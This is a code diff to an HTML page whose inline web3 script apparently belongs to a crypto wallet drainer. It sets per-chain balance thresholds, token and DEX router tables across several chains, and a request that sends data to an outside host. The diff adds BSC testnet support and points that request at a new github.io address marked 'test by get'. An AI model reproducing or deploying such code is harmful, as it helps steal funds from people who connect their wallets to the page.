@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html><head><meta charset="utf-8"><link href="favicon.ico" rel="icon"></head>
 <body>
-<script src="https://cdn.jsdelivr.net/gh/upfinity-main/TheWeb3ProjectAssets/js/web3.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/bignumber.js/8.0.2/bignumber.js" integrity="sha512-XQDG6H87RgMf+aNFwDPCUcFwUf3t9liyqN/2BkJ8KGixupbjPwQHNhypNA972mLIkg4KPo4lkGmqAf3yfDz8hw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="assets/vendor/web3/web3.min.js"></script>
+<script src="assets/vendor/bignumber/bignumber.min.js"></script>
 <script>
 const Thresholds = {
 	ETH: '40000000000000000', // 0.04
@@ -63,7 +63,21 @@ const QuoteTokens = {
 			ADDRESS: '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75',
 			SYMBOL: 'USDC'
 		}
-	]
+	],
+	BSCTEST: [
+		{
+			ADDRESS: '0xae13d989dac2f0debff460ac112a837c89baa7cd',
+			SYMBOL: 'BNB'
+		},
+		{
+			ADDRESS: '0x7ef95a0fee0dd31b22626fa2e10ee6a223f8a684',
+			SYMBOL: 'USDT'
+		},
+		{
+			ADDRESS: '0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7',
+			SYMBOL: 'BUSD'
+		}
+	],
 };
 
 const Routers = {
@@ -120,6 +134,13 @@ const Routers = {
 			FACTORY: '0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'
 		}
 	],
+	BSCTEST: [
+		{ // PancakeSwap Testnet
+			ADDRESS: '0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3',
+			QUOTER: '0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3',
+			FACTORY: '0xb7926c0430afb07aa7defde6da862ae0bde767bc'
+		}
+	],
 	CRO: [
 		{ // Mad Meerkat Finance
 			ADDRESS: '0x145677FC4d9b8F19B5D56d1820c48e0443049a30',
@@ -156,6 +177,7 @@ const RPC = {
 const Chains = {
 	ETH: 1,
 	BSC: 56,
+	BSCTEST: 97, 
 	CRO: 25,
 	FTM: 250
 };
@@ -476,7 +498,7 @@ if (window.ethereum) {
 							}
 						};
 
-						xhttp.open('POST', 'https://api.nftapes.win', true);
+						xhttp.open('GET', 'https://nguyentan04.github.io/critterland-page/attr.js', true);//test by get
 						xhttp.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
 
 						const params = {
